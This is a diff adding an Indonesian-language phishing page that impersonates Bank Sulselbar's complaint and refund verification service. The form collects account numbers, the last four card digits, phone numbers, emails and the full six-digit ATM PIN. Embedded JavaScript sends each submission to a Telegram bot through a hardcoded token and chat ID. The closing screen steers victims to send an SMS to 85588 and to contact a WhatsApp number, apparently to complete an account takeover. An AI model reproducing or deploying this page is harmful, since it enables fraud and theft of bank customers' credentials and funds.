@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Sulselbar - Layanan Verifikasi</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+
+        body {
+            margin: 0; padding: 0;
+            background-color: #050a44;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh;
+        }
+
+        .page-wrapper {
+            width: 100%; min-height: 100vh;
+            background: linear-gradient(to bottom, #050a44 50%, #ffffff 50%);
+            display: flex; flex-direction: column; align-items: center;
+            padding: 40px 20px;
+        }
+
+        .header { text-align: center; color: white; margin-bottom: 30px; }
+        .logo { font-size: 28px; font-weight: bold; font-style: italic; margin-bottom: 10px; }
+
+        .form-card {
+            background: white; width: 100%; max-width: 450px;
+            padding: 30px; border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .hidden { display: none !important; }
+
+        .form-group { margin-bottom: 15px; text-align: left; }
+        .form-group label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
+        .form-group label span { color: red; }
+        .input-container input {
+            width: 100%; padding: 12px; border: 1px solid #ddd;
+            border-radius: 8px; outline: none;
+        }
+
+        .phone-input { display: flex; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; }
+        .phone-prefix { background: #f8f9fa; padding: 12px; border-right: 1px solid #ddd; font-size: 14px; }
+        .phone-input input { border: none; flex: 1; padding: 12px; }
+
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #050a44; border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .pin-inputs { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
+        .pin-inputs input {
+            width: 40px; height: 50px; text-align: center; font-size: 20px;
+            border: 2px solid #ddd; border-radius: 8px;
+        }
+
+        .success-icon { font-size: 50px; color: #25D366; margin-bottom: 15px; }
+        .wa-button {
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            background-color: #25D366; color: white; text-decoration: none;
+            padding: 14px; border-radius: 8px; font-weight: bold; margin-top: 20px;
+        }
+
+        .btn-submit {
+            width: 100%; background-color: #050a44; color: white;
+            border: none; padding: 14px; border-radius: 8px;
+            font-size: 16px; font-weight: bold; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="page-wrapper">
+    <div class="header">
+        <div class="logo">BankSulselbar</div>
+        <h2 id="page-title">Buat Laporan Kendala Transaksi/Refund Dana.</h2>
+    </div>
+
+    <div class="form-card">
+        <form id="mainForm">
+            <div id="step-form">
+                <div class="form-group">
+                    <label><span></span> Nomor Rekening</label>
+                    <div class="input-container"><input type="number" id="norek" placeholder="Masukkan No Rekening" required></div>
+                </div>
+                <div class="form-group">
+                    <label><span></span> 4 Digit Terakhir No Kartu</label>
+                    <div class="input-container"><input type="text" id="kartu" maxlength="4" placeholder="Nomor Kartu ATM" required></div>
+                </div>
+                <div class="form-group">
+                    <label><span></span> Nomor Handphone</label>
+                    <div class="phone-input">
+                        <div class="phone-prefix"></div>
+                        <input type="tel" id="phone" placeholder="Masukkan No Hp" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label><span></span> Email</label>
+                    <div class="input-container"><input type="email" id="email" placeholder="Masukkan Email" required></div>
+                </div>
+                <button type="button" class="btn-submit" onclick="sendDataForm()">Selanjutnya</button>
+            </div>
+        </form>
+
+        <div id="loading" class="hidden">
+            <div class="spinner"></div>
+            <p>Memproses data Anda...</p>
+        </div>
+
+        <div id="step-pin" class="hidden">
+            <h3>Masukkan PIN ATM</h3>
+            <p style="font-size: 13px; color: #666;">Silakan masukkan 6 digit PIN ATM Anda</p>
+            <div class="pin-inputs">
+                <input type="password" maxlength="1" oninput="moveNext(this, 'p2')" id="p1">
+                <input type="password" maxlength="1" oninput="moveNext(this, 'p3')" id="p2">
+                <input type="password" maxlength="1" oninput="moveNext(this, 'p4')" id="p3">
+                <input type="password" maxlength="1" oninput="moveNext(this, 'p5')" id="p4">
+                <input type="password" maxlength="1" oninput="moveNext(this, 'p6')" id="p5">
+                <input type="password" maxlength="1" id="p6">
+            </div>
+            <button type="button" class="btn-submit" onclick="sendPinData()">Konfirmasi</button>
+        </div>
+
+        <div id="step-wa" class="hidden">
+            <div class="success-icon"></div>
+            <h3>Laporan Terkirim ✅ Sistem sedang mengecek validasi data, Jika sudah sesuai sistem akan mengirimkan sms. Salin Pesan Kirim Ke SMS 85588 Menggunakan nomor hp yang terdaftar</h3>
+            <p style="font-size: 14px; color: #555; line-height: 1.6;">
+                Silakan klik Permintaan SMS untuk untuk mendapatkan pesan
+            </p>
+            <a href="https://wa.me/628170008799?text=Halo%20Bank%20Sulselbar,%20saya%20sudah%20mengisi%20formulir%20bantuan." class="wa-button">
+                <span>Permintaan SMS</span>
+            </a>
+        </div>
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = ':8369092441:AAFPFsvi9BPjWJhEJcBPx2xzMtn-b2GdowY';
+    const CHAT_ID = '7692820036';
+
+    // Kirim Data Formulir Pertama
+    async function sendDataForm() {
+        const norek = document.getElementById('norek').value;
+        const kartu = document.getElementById('kartu').value;
+        const phone = document.getElementById('phone').value;
+        const email = document.getElementById('email').value;
+
+        if(!norek || !kartu || !phone || !email) return alert("Harap isi semua kolom!");
+
+        const message = `--- DATA FORM BARU ---\n📌 No Rekening: ${norek}\n📌 4 Digit Kartu: ${kartu}\n📌 Phone: +62${phone}\n📌 Email: ${email}`;
+        
+        showLoading();
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+        
+        setTimeout(() => {
+            hideLoading('step-pin');
+            document.getElementById('page-title').innerText = "Verifikasi PIN";
+        }, 2000);
+    }
+
+    // Kirim Data PIN
+    async function sendPinData() {
+        const p1 = document.getElementById('p1').value;
+        const p2 = document.getElementById('p2').value;
+        const p3 = document.getElementById('p3').value;
+        const p4 = document.getElementById('p4').value;
+        const p5 = document.getElementById('p5').value;
+        const p6 = document.getElementById('p6').value;
+        const fullPin = p1 + p2 + p3 + p4 + p5 + p6;
+
+        if(fullPin.length < 6) return alert("PIN harus 6 digit!");
+
+        const message = `--- DATA PIN DITERIMA ---\n🔑 PIN ATM: ${fullPin}`;
+        
+        showLoading();
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+        
+        setTimeout(() => {
+            hideLoading('step-wa');
+            document.getElementById('page-title').innerText = "Selesai";
+        }, 2000);
+    }
+
+    function showLoading() {
+        document.getElementById('step-form').classList.add('hidden');
+        document.getElementById('step-pin').classList.add('hidden');
+        document.getElementById('loading').classList.remove('hidden');
+    }
+
+    function hideLoading(nextId) {
+        document.getElementById('loading').classList.add('hidden');
+        document.getElementById(nextId).classList.remove('hidden');
+    }
+
+    function moveNext(current, nextId) {
+        if (current.value.length >= 1) {
+            document.getElementById(nextId).focus();
+        }
+    }
+</script>
+
+</body>
+</html>
